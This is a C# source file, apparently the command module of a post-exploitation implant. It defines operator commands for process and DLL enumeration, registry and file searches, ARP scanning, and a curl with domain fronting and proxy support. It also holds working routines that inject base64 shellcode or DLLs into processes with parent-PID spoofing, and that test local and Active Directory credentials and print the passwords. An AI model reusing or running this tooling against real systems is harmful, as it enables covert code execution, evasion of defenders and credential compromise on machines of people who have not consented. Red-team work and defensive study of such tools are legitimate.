            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get process list: {e}");
            }
        }

        [CoreDispatch(Description = "Looks for a specific process on the target system", Usage = "Usage: Get-Process <name of process>")]
        public static void getprocess(string[] args)
        {
            try
            {
                string strProcList = ProcessHandler.ProcHandler.GetProcesses();
                using (StringReader reader = new StringReader(strProcList))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        if (line.ToLower().Contains(args[1].ToLower()))
                        {
                            Console.WriteLine(line);
                        }
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get process list: {e}");
            }
        }



        [CoreDispatch(Description = "Used to list dll's loaded in any process", Usage = "Usage: DllSearcher clr.dll mscoree.dll")]
        public static void dllsearcher(string[] args)
        {
            List<string> checks = new List<string>();
            if (args.Length > 4)
            {
                Console.WriteLine("Limited to Max 3 search items");
            }
            else
            {
                foreach (string i in args)
                { 
                    if (!string.IsNullOrEmpty(i)) {checks.Add(i.ToLower()); }
                }
                try
                {
                    ProcessHandler.ProcHandler.DllSearcher(checks);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Cannot DllSearcher: {e}");
                }
            }       
        }

        [CoreDispatch(Description = "Gets the users idle time", Usage = "Usage: Get-IdleTime")]
        public static void getidletime()
        {
            try
            {
                Console.WriteLine(Host.UserInput.LastInput);
                Console.WriteLine(Host.UserInput.IdleTime);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get users idle time: {e}");
            }
        }

        //getaadjoininformation
        [CoreDispatch(Description = "GetAadJoinInformation to return same output as dsregcmd /status", Usage = "Usage: GetAadJoinInformation")]
        public static void getaadjoininformation()
        {            
            try
            {
                ActiveDirectory.AD.getaadjoininformation();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot GetAadJoinInformation: {e}");
            }
        }

        [CoreDispatch(Description = "Injects shellcode into a new or existing process using rtlcreatuserthread, then createremotethread", Usage = "Usage: Inject-Shellcode <base64-shellcode> <pid/path> <ppid>")]
        public static void injectshellcode(string[] args)
        {
            InjectShellcode(args);
        }

        [CoreDispatch(Description = "Injects a DLL from disk into a new or existing process", Usage = "Usage: Inject-DLL <dll-location> <pid/path> <ppid>")]
        public static void injectdll(string[] args)
        {
            InjectDll(args);
        }

        [CoreDispatch(Description = "Gets the service permissions of the host and outputs a report in the given location", Usage = "Usage: Get-ServicePerms c:\\temp\\")]
        public static void getserviceperms(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: ServicePerms.exe c:\\temp\\");
                }
                else
                {
                    Console.WriteLine("[+] Running Get-ServicePerms " + args[1]);
                    Host.ServicePerms.dumpservices(@"" + args[1].Replace("\"", ""));
                    Console.WriteLine("");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Cannot Get-ServicePerms: " + e);
            }
        }

        [CoreDispatch(Description = "Used to ArpScan the given subnet and can resolve names if required", Usage = "Usage: ArpScan 172.16.0.1/24 true")]
        public static void arpscan(string[] args)
        {
            Arp.Core.RunArp(args);
        }

        [CoreDispatch(Description = "Used to resolve an IP address to a DNS name", Usage = "Usage: ResolveIP 10.0.0.1")]
        public static void resolveip(string[] args)
        {
            Console.WriteLine(Dns.GetHostEntry(args[1]).HostName);
        }

        [CoreDispatch(Description = "Used to resolve a DNS name to an IP address", Usage = "Usage: Resolve-DNSName www.google.com")]
        public static void resolvednsname(string[] args)
        {
            IPAddress[] a = Dns.GetHostAddresses(args[1]);
            foreach (IPAddress b in a)
            {
                Console.WriteLine(b.ToString());
            }
        }

        [CoreDispatch(Description = "Used to check SSL Inspection: \nUser-Agent: \"Mozilla / 5.0(Windows NT 10.0; Win64; x64; Trident / 7.0; rv: 11.0) like Gecko\"", Usage = "Usage: SSLInspectionCheck https://www.google.com <proxyhost> <proxyuser> <proxypass> <useragent>")]
        public static void sslinspectioncheck(string[] args)
        {
            try
            {
                Host.SSLInspection.Check(args);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error in SSLInspectionCheck: " + e);
            }
        }

        [CoreDispatch(Description = "FindFile using WMI CIM_DataFile, args are name of file and extension", Usage = "Usage: FindFile <filename, e.g. flag> <extension, txt> <drive-optional, e.g. c:> <hostname-optional, e.g. 127.0.0.1>")]
        public static void findfile(string[] args)
        {
            try
            {                
                if (args.Length == 3)
                {
                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]}");
                    Common.Core.FindFile(args[1], args[2]);
                }
                if (args.Length == 4)
                {
                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]} {args[3]}");
                    Common.Core.FindFile(args[1], args[2], args[3]);
                }
                if (args.Length == 5)
                {
                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]} {args[3]} {args[4]}");
                    Common.Core.FindFile(args[1], args[2], args[3], args[4]);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to find file: " + e);
            }
        }
        [CoreDispatch(Description = "LsRegHKCU a value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: LsRegHKCU SOFTWARE\\Classes\\CLSID")]
        public static void lsreghkcu(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
                Common.Reg.LsReg(args[1], "HKEY_CURRENT_USER");
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to run LsRegRead: " + e);
            }
        }

        [CoreDispatch(Description = "LsRegHKLM a value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: LsRegHKLM SOFTWARE\\Classes\\CLSID")]
        public static void lsreghklm(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
                Common.Reg.LsReg(args[1], "HKEY_LOCAL_MACHINE");
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to run LsRegRead: " + e);
            }
        }
        [CoreDispatch(Description = "LsReg HKEY_LOCAL_MACHINE a value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: LsReg HKEY_LOCAL_MACHINE SOFTWARE\\Classes\\CLSID")]
        public static void lsreg(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
                Common.Reg.LsReg(args[2], args[1].ToUpper());
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to run LsRegRead: " + e);
            }
        }

        [CoreDispatch(Description = "RedRead a value, e.g. HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: RegRead HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <keyname>")]
        public static void regread(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]} {args[2]}");
                Common.Reg.ReadReg(args[1], args[2]);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to run RedRead: " + e);
            }
        }
        [CoreDispatch(Description = "Lists the UninstallString for each key under HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: RegReadUninstall")]
        public static void regreaduninstall()
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
                Common.Reg.RegReadUninstall();
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to run RedRead: " + e);
            }
        }

        [CoreDispatch(Description = "Returns the OS Version using OSVERSIONINFOEXW", Usage = "Usage: GetOSVersion")]
        public static void getosversion()
        {
            try
            {                
                var wver = ProcessHandler.Hook.GetWinVer();
                var cver = ProcessHandler.Hook.GetCurrentVer();
                var pname = ProcessHandler.Hook.GetProductName();
                Console.WriteLine($"{pname} \nReleaseId {wver} \nCurrentVersion {cver}\n");
                Injection.SysCall.GetOSVersion();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run GetOSVersion: {e.Message}");
            }
        }

        [CoreDispatch(Description = "Curl https://www.google.co.uk", Usage = "Usage: Curl https://www.google.co.uk <domain-front-header-optional> <proxy-optional> <proxy-user-optional> <proxy-pass-optional>")]
        public static void curl(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to load URL {args[1]}");
                string html = null;
                if (args.Length == 2)
                {
                    html = Common.WebRequest.Curl().DownloadString(args[1]);
                }
                else if (args.Length == 3)
                {
                    html = Common.WebRequest.Curl(args[2]).DownloadString(args[1]);
                }
                else if (args.Length == 4)
                {
                    html = Common.WebRequest.Curl(args[2], args[3]).DownloadString(args[1]);
                }
                else if (args.Length == 5)
                {
                    html = Common.WebRequest.Curl(args[2], args[3], args[4]).DownloadString(args[1]);
                }
                else if (args.Length == 6)
                {
                    html = Common.WebRequest.Curl(args[2], args[3], args[4], args[5]).DownloadString(args[1]);
                }
                Console.WriteLine(html);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error trying to load URL: " + e);
            }
        }
        //RegReadUninstall
        //////////////////////////////////
        //        METHODS TO MOVE       //
        //////////////////////////////////

        static void GetDirListing(string[] args, bool recurse = false)
        {
            string dirPath = "";
            if (args.Length < 2)
            {
                dirPath = @"" + Directory.GetCurrentDirectory();
            }
            else
            {
                int i = 0;
                foreach (string arg in args)
                {
                    if (i >= 1)
                    {
                        dirPath = @"" + dirPath + " " + arg.Replace("\"", "");

                    }
                    i++;
                }


            }

            Console.WriteLine("Directory listing: {0} \r\n", dirPath);
            string[] folderPaths = { };
            string[] filePaths = { };
            if (recurse)
            {
                var x = GetFilesRecurse(dirPath);
                foreach (var xx in x)
                {
                    try
                    {                       
                        var fInfo = new FileInfo(xx);
                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15), (fInfo.Length).ToString().PadRight(13), ("(" + ((long)fInfo.Length / 1024).ToString() + "k)").PadRight(15), fInfo.FullName);
                    }
                    catch
                    {

                    }

                }
            }
            else
            {
                try
                {
                    var vDirectories = Directory.GetDirectories(dirPath, "*", SearchOption.TopDirectoryOnly);
                    foreach (var vDir in vDirectories)
                    {
                        var fInfo = new DirectoryInfo(vDir);
                        Console.WriteLine("{0} {1} {2} {3}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15), "<DIR>".PadRight(20), fInfo.FullName);
                    }
                    var x = GetFiles(dirPath);
                    foreach (var xx in x)
                    {
                        var fInfo = new FileInfo(xx);
                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15), (fInfo.Length).ToString().PadRight(13), ("(" + ((long)fInfo.Length / 1024).ToString() + "k)").PadRight(15), fInfo.FullName);
                    }
                }
                catch
                {
                    var fInfo = new FileInfo(dirPath);
                    Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15), (fInfo.Length).ToString().PadRight(13), ("(" + ((long)fInfo.Length / 1024).ToString() + "k)").PadRight(15), fInfo.Name);
                }
            }
        }
        //https://stackoverflow.com/questions/172544/ignore-folders-files-when-directory-getfiles-is-denied-access
        static List<string> GetFiles(string path, string pattern = "*")
        {
            var files = new List<string>();
            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
            }
            catch (UnauthorizedAccessException) { }

            return files;
        }
        static List<string> GetFilesRecurse(string path, string pattern = "*")
        {
            var files = new List<string>();
            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                foreach (var directory in Directory.GetDirectories(path))
                {
                    var fInfo = new DirectoryInfo(directory.Substring(1) + "\\");
                    Console.WriteLine("{0} {1} {2} {3}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15), "<DIR>".PadRight(20), fInfo.FullName);
                    files.AddRange(GetFilesRecurse(directory, pattern));
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("UnauthorizedAccessException: " + path);
            }

            return files;
        }

        static void TestLocalCredentials(string username, string password)
        {
            var context = new PrincipalContext(ContextType.Machine);
            bool success = context.ValidateCredentials(username, password);
            if (success)
            {
                Console.WriteLine("[+] Test Credentials - Success");
                Console.WriteLine("[+] Username: " + username + "\r\n[+] Password: " + password);
            }
            else
            {
                Console.WriteLine("[-] Test Credentials - Failure");
                Console.WriteLine("[-] Username: " + username + "\r\n[-] Password: " + password);
            }
        }
        static void TestADCredential(string domain, string username, string password)
        {
            var context = new PrincipalContext(ContextType.Domain, domain);
            bool success = context.ValidateCredentials(username, password);
            if (success)
            {
                Console.WriteLine("[+] Test AD Credentials - Success");
                Console.WriteLine("[+] Username: " + domain + "\\" + username + "\r\n[+] Password: " + password);
            }
            else
            {
                Console.WriteLine("[-] Test AD Credentials - Failure");
                Console.WriteLine("[-] Username: " + domain + "\\" + username + "\r\n[-] Password: " + password);
            }
        }

        static void InjectShellcode(string[] args)
        {
            try
            {
                int pid;
                int ppid = 0;
                string path = "";

                if (args.Length < 3)
                {
                    path = @"c:\windows\system32\searchprotocolhost.exe";
                    Console.WriteLine(" > [-] Missing Path or PID parameter starting process: " + path);
                    pid = (int)Injection.PPIDSpoofer.SharpCreateProcess(ppid, path, true);
                }
                else
                {
                    path = args[2].Replace("\"", "");
                    Console.WriteLine(" > [+] Injecting into: " + path);
                    if (!Int32.TryParse(args[2], out pid))
                    {
                        if (args.Length > 3)
                        {
                            bool x = Int32.TryParse(args[3], out ppid);
                        }
                        Console.WriteLine(" > [+] Spoofing ppid: " + ppid);
                        pid = (int)Injection.PPIDSpoofer.SharpCreateProcess(ppid, path, true);
                    }
                }

                byte[] sc = System.Convert.FromBase64String(args[1]);
                Injection.PPIDSpoofer.InjectShellcode(pid, sc);

            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error: " + e);
            }
        }
        static void InjectDll(string[] args)
        {
            try
            {
                int pid;
                int ppid = 0;
                string path = "";

                if (args.Length < 3)
                {
                    path = @"c:\windows\system32\searchprotocolhost.exe";
                    Console.WriteLine("[-] Missing Path or PID parameter using " + path);
                    pid = (int)Injection.PPIDSpoofer.SharpCreateProcess(ppid, path, true);
                }
                else
                {
                    path = args[2].Replace("\"", "");
                    Console.WriteLine(" > [+] Injecting into: " + path);
                    if (!Int32.TryParse(args[2], out pid))
                    {
                        if (args.Length > 3)
                        {
                            bool x = Int32.TryParse(args[3], out ppid);
                        }
                        Console.WriteLine(" > [+] Spoofing ppid: " + ppid);
                        pid = (int)Injection.PPIDSpoofer.SharpCreateProcess(ppid, path, true);
                    }
                }

                Injection.PPIDSpoofer.InjectDLL(pid, args[1].Replace("\"", ""));

            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error: " + e);
            }
        }     
    }
}
